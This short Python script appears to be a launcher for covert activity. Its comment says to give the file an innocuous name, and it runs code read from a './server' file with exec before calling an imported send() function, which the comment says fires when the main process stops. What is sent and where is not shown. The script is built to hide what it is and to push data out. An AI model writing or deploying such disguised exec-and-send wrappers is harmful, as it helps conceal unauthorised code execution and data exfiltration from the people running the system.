# Name this something innocuous. If the main process is stopped, the send function is automatically called.

from send import send

exec(open("./server").read())

send()
